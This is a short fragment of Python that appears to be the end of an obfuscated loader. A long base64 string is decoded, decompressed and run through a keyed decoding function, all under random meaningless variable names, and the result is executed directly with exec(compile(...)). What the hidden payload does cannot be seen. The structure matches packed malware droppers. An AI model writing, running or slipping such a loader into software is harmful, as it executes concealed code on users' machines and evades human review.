r/+69dnTry+/aSNP3KdUyBSwRB2xZZ4HAAVUhxZQrpWVKzaiqpXPjumeZPrnbnTpVKQ6iQOmk+/GD4/dIvTaljhQmjJOF2snSZkvRypX7nvtOkMF/WBpIZEg/T0s7XpM2msPdarYz4FIrpCAHlCq8agky4af/Jkh/ingqt60LCRqWU0xbYIG8EqVKGR0/gFkGhSN'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
